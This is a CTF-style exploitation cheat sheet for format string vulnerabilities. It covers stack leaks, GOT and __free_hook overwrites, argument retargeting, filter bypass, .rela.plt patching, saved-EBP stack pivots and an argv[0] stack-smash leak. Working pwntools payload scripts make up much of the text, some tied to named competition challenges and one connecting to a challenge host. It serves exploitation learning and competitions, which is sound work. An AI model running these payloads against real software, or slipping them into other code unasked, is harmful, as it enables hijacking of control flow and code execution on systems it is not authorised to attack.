## Format String Basics

- Leak stack: `%p.%p.%p.%p.%p.%p`
- Leak specific offset: `%7$p`
- Write value: `%n` (4-byte), `%hn` (2-byte), `%hhn` (1-byte), `%lln` (8-byte)
- GOT overwrite for code execution

**Write size specifiers (x86-64):**
| Specifier | Bytes Written | Use Case |
|-----------|---------------|----------|
| `%n` | 4 | 32-bit values |
| `%hn` | 2 | Split writes |
| `%hhn` | 1 | Precise byte writes |
| `%lln` | 8 | Full 64-bit address (clears upper bytes) |

**IMPORTANT:** On x86-64, GOT entries are 8 bytes. Using `%n` (4-byte) leaves upper bytes with old libc address garbage. Use `%lln` to write full 8 bytes and zero upper bits.

**Arbitrary read primitive:**
```python
def arb_read(addr):
    # %7$s reads string at address placed at offset 7
    payload = flat({0: b'%7$s#', 8: addr})
    io.sendline(payload)
    return io.recvuntil(b'#')[:-1]
```

**Arbitrary write primitive:**
```python
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {target_addr: value})
```

**Manual GOT overwrite (x86-64):**
```python
# Format: %<value>c%<offset>$lln + padding + address
# Address at offset 8 when format is 16 bytes

win = 0x4011f6
target_got = 0x404018  # e.g., printf@GOT

fmt = f'%{win}c%8$lln'.encode()  # Write 'win' chars then store to offset 8
fmt = fmt.ljust(16, b'X')        # Pad to 16 bytes (2 qwords)
payload = fmt + p64(target_got)  # Address lands at offset 6 + 16/8 = 8

# Note: This prints ~4MB of spaces - be patient waiting for output
```

**Offset calculation for addresses:**
- Buffer typically starts at offset 6 (after register args)
- If format string is padded to N bytes, addresses start at offset: `6 + N/8`
- Example: 16-byte format → addresses at offset 8
- Example: 32-byte format → addresses at offset 10
- Example: 64-byte format → addresses at offset 14

**Verify offset with test payload:**
```python
# Put known address after N-byte format, check with %<calculated_offset>$p
test = b'%8$p___XXXXXXXXX'  # 16 bytes
payload = test + p64(0xDEADBEEF)
# Should print 0xdeadbeef if offset 8 is correct
```

**GOT target selection:**
- If `exit@GOT` doesn't work, try other GOT entries
- `printf@GOT`, `puts@GOT`, `putchar@GOT` are good alternatives
- Target functions called AFTER the format string vulnerability
- Check call order in disassembly to pick best target

## Argument Retargeting (Non-Positional %n Trick)

Use this when you cannot embed addresses (input filtering, newline issues) but can still use `%n` and a stack pointer is available as an argument.

**Key idea:** Non-positional specifiers consume arguments in order. You can overwrite a *future* argument (which is itself a pointer) before it is used, then use it as an arbitrary write target.

**Why non-positional:** Positional formats (`%22$hn`) are cached up front by glibc, so changing the underlying stack slot after parsing won’t change the pointer. Non-positional `%n` avoids that cache.

**Workflow (example):**
1. Leak offsets: find a stack pointer argument you can overwrite (e.g., saved `rbp` on the stack).
2. Advance the argument index with `%c` (each `%c` consumes one argument).
3. Use `%n` to write a 4-byte value into that pointer slot (e.g., make arg22 point to `exit@GOT`).
4. Print additional chars and use `%hn` to write the low 2 bytes to the now-retargeted pointer.

**Pattern (conceptual):**
```text
%c%c%c...%c      # consume args to reach pointer slot
%<big>c%n        # overwrite pointer slot to target_addr (e.g., exit@GOT)
%<delta>c%hn     # write low 2 bytes of win to that GOT entry
```

**Compute widths:**
- After writing `target_addr` with `%n`, the printed count is `C`.
- To write low 2 bytes `W` with `%hn`, print:
  - `delta = (W - (C % 65536)) mod 65536`

**When it works well:**
- No PIE / Partial RELRO (GOT writable)
- You can afford large outputs (millions of chars)

**Stack layout discovery (find your input offset):**
```text
%1$p %2$p %3$p ... %50$p
```
- Your input appears at some offset (commonly 6-8)
- Canary: looks like `0x...00` (null byte at end)
- Saved RBP: stack address pattern
- Return address: code address (PIE or libc)

## Blind Pwn (No Binary Provided)

When no binary is given, use format strings to discover everything:

**1. Confirm vulnerability:**
```text
> %p-%p-%p-%p
0x563b6749100b-0x71-0xffffffff-0x7ffff9c37b80
```

**2. Discover protections by leaking stack:**
- Find canary (offset ~39, pattern `0x...00`)
- Find saved RBP (offset ~40, stack address)
- Find return address (offset ~41-43, code pointer)

**3. Identify PIE base:**
- Leak return address pointing into main/binary
- Subtract known offset to get base (may need guessing)

**4. Dump GOT to identify libc:**
```python
# Read GOT entries for known functions
puts_addr = arb_read(pie_base + got_puts_offset)
stack_chk_addr = arb_read(pie_base + got_stack_chk_offset)
```

**5. Cross-reference libc database:**
- https://libc.blukat.me/
- https://libc.rip/
- Input multiple function addresses to identify exact libc version

**6. Calculate libc base:**
```python
# From leaked __libc_start_main return or similar
libc.address = leaked_ret_addr - known_offset
```

**Common stack offsets (x86_64):**
| Offset | Typical Content |
|--------|-----------------|
| 6-8 | User input buffer |
| ~39 | Stack canary |
| ~40 | Saved RBP |
| ~41-43 | Return address |

## Format String with Filter Bypass

**Pattern (Cvexec):** `filter_string()` strips `%` but skippable with `%%%p`.

**Filter bypass:** If filter checks adjacent chars after `%`:
- `%p` → filtered
- `%%p` → properly escaped (prints literal `%p`)
- `%%%p` → third `%` survives, prints stack value

**GOT overwrite via format string (byte-by-byte with `%hhn`):**
```python
# Write last 3 bytes of debug() addr to strcmp@GOT across 3 payloads
# Pad address to consistent stack offset (e.g., 14th position)
for byte_offset in range(3):
    target = got_strcmp + byte_offset
    byte_val = (debug_addr >> (byte_offset * 8)) & 0xff
    # Calculate chars to print, accounting for previous output
    payload = f"%%%dc%%%d$hhn" % (byte_val - prev_written, 14)
    payload = payload.encode().ljust(48, b'X') + p64(target)
```

## Format String Canary + PIE Leak

**Pattern (My Little Pwny):** Format string vulnerability to leak canary and PIE base, then buffer overflow.

**Two-stage attack:**
```python
# Stage 1: Leak via format string
io.sendline(b'%39$p.%41$p')  # Canary at offset 39, return addr at 41
leak = io.recvline()
canary = int(leak.split(b'.')[0], 16)
pie_base = int(leak.split(b'.')[1], 16) - known_offset

# Stage 2: Buffer overflow with known canary
win = pie_base + win_offset
payload = b'A' * buf_size + p64(canary) + p64(0) + p64(win)
io.sendline(payload)
```

## __free_hook Overwrite via Format String (glibc < 2.34)

**Pattern (Notetaker, PascalCTF 2026):** Full RELRO + No PIE + format string vulnerability. Can't overwrite GOT, but `__free_hook` is writable.

**Key insight:** `free(ptr)` passes `ptr` in `rdi` as first argument. If `__free_hook = system`, then `free("cat flag")` executes `system("cat flag")`.

```python
# 1. Leak libc via format string
p.sendline(b'%43$p')  # __libc_start_main return address
libc_base = int(leaked, 16) - LIBC_START_MAIN_RET_OFFSET

# 2. Write system() address to __free_hook
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
payload = fmtstr_payload(8, {free_hook: system_addr}, write_size='byte')

# 3. Trigger: send command as menu input, program calls free(input_buffer)
p.sendline(b'cat flag')  # free() → system("cat flag")
```

**When to use:** Full RELRO (no GOT overwrite) + glibc < 2.34 (hooks still exist). For glibc >= 2.34, hooks are removed - target return addresses or `_IO_FILE` structs instead.

## .rela.plt / .dynsym Patching

**When to use:** GOT addresses contain bad bytes (e.g., 0x0a with fgets), making direct GOT overwrite impossible. Requires `.rela.plt` and `.dynsym` in writable memory.

**Technique:** Patch `.rela.plt` relocation entry symbol index to point to different symbol, then patch `.dynsym` symbol's `st_value` with `win()` address. When the original function is called, dynamic linker reads patched relocation and jumps to `win()`.

```python
# Key addresses (from readelf -S)
REL_SYM_BYTE = 0x4006ec   # .rela.plt[exit].r_info byte containing symbol index
STDOUT_STVAL_LO = 0x4004e8  # .dynsym[11].st_value low halfword
STDOUT_STVAL_HI = 0x4004ea  # .dynsym[11].st_value high halfword

# Format string writes via %hhn (8-bit) and %hn (16-bit)
# 1. Write symbol index 0x0b to r_info byte
# 2. Write win() address low halfword to st_value
# 3. Write win() address high halfword to st_value+2
```

**When GOT has bad bytes but .rela.plt/.dynsym don't:** This technique bypasses all GOT byte restrictions since you never write to GOT directly.

## Format String for Game State Manipulation (UTCTF 2026)

**Pattern (Small Blind):** Poker/card game where player name is vulnerable to format string. Stack contains pointers to game state variables (player chips, dealer chips). Write arbitrary values to win condition.

**Key insight:** `%n` writes the number of characters printed so far. Use `%Xc` to control that count, then `%N$n` to write to the Nth stack argument (which points to a game variable).

**Exploitation:**
```python
from pwn import *

p = remote('challenge.utctf.live', 7255)
p.recvuntil(b'Enter your name: ')

# %1000c prints 1000 chars (padding), then %7$n writes 1000 to stack pos 7
# Stack position 7 = pointer to player_chips variable
p.sendline(b'%1000c%7$n')

# Player now has 1000 chips → triggers win condition
# Collect flag from game output
```

**Discovery workflow:**
1. **Confirm format string:** Send `%p.%p.%p.%p` as name, check for hex leaks
2. **Map stack positions:** Try `%6$n`, `%7$n`, `%8$n` with different `%Xc` values
3. **Identify which variable changed:** Compare game output (chips, score, health) before/after
4. **Determine win condition:** May be `player_chips >= threshold` or `player > dealer`
5. **Craft winning payload:** Set player chips high (`%9999c%7$n`) or dealer chips to 0 (`%6$n`)

**Common game state patterns on stack:**
| Position | Typical Variable |
|----------|-----------------|
| 6 | Pointer to dealer/opponent state |
| 7 | Pointer to player state |
| 8-10 | Score, health, inventory |

**When `%n` writes to adjacent variables:** If player and dealer chips are adjacent in memory (4 bytes apart), positions N and N+1 point to them. Write 0 to dealer (`%N$n` with 0 chars printed) and high value to player (`%9999c%(N+1)$n`).

**Key insight:** Format string vulnerabilities in game binaries are simpler than typical pwn — you don't need shell, just manipulate game state to trigger the win condition. Map stack positions to game variables, then write the winning values.

## Format String Saved EBP Overwrite for .bss Pivot (PlaidCTF 2015)

**Pattern (EBP):** Format string buffer is in `.bss` (fixed address) rather than on the stack. Classic `%n` arbitrary-write requires attacker addresses on the stack, which is impossible with `.bss` buffers. Instead, overwrite the saved EBP to redirect the function epilogue (`leave; ret`) to the `.bss` buffer.

**How `leave; ret` works:**
```asm
leave:  mov esp, ebp    ; esp = saved_ebp
        pop ebp         ; ebp = [saved_ebp]
ret:    pop eip         ; eip = [saved_ebp + 4]
```

**Exploit layout in `.bss` buffer at address `0x0804A080`:**
```text
[addr_of_buf-4][padding_to_write_value][%n][shellcode...]
```
Write `buf_addr - 4` (e.g., `0x0804A07C`) into saved EBP via `%n`. On function return, `leave` sets `esp = 0x0804A07C`, then `ret` jumps to the value at `0x0804A080` — the start of shellcode.

**Key insight:** When the format string buffer is at a fixed `.bss` address (not stack), overwrite saved EBP to pivot the stack into `.bss`. The `leave; ret` epilogue uses EBP to set ESP, so controlling EBP controls where `ret` reads EIP from. Place shellcode address (or ROP chain) at `buf_addr` and shellcode at `buf_addr + offset`.

## argv[0] Overwrite for Stack Smash Info Leak (HITCON CTF 2015)

**Pattern (nanana):** When a stack canary is corrupted, glibc's `__stack_chk_fail` prints: `*** stack smashing detected ***: <argv[0]> terminated`. Since `argv[0]` is a pointer stored on the stack, overwriting it with the address of a secret (e.g., global password buffer) leaks the secret through the crash message.

**Attack steps:**
1. Overflow past the canary (deliberately corrupting it)
2. Continue overwriting the stack to reach `argv[0]` (pointer to program name)
3. Replace `argv[0]` with the address of the target data (e.g., `0x601090` = `g_password`)
4. The stack smash handler prints: `*** stack smashing detected ***: <password_contents>`

```python
# Overflow to overwrite argv[0] with address of global password
payload = b"A" * canary_offset     # reach canary (deliberately corrupt it)
payload += b"B" * (argv0_offset - canary_offset)  # padding to argv[0]
payload += p64(password_addr)      # overwrite argv[0] -> password string
```

**Key insight:** A "failed" exploit that triggers `__stack_chk_fail` becomes an information leak when `argv[0]` is overwritten. This is useful as a first stage: leak a secret (password, canary, address), then use it in a second connection for the real exploit. Works because `argv` is stored on the stack above local variables.
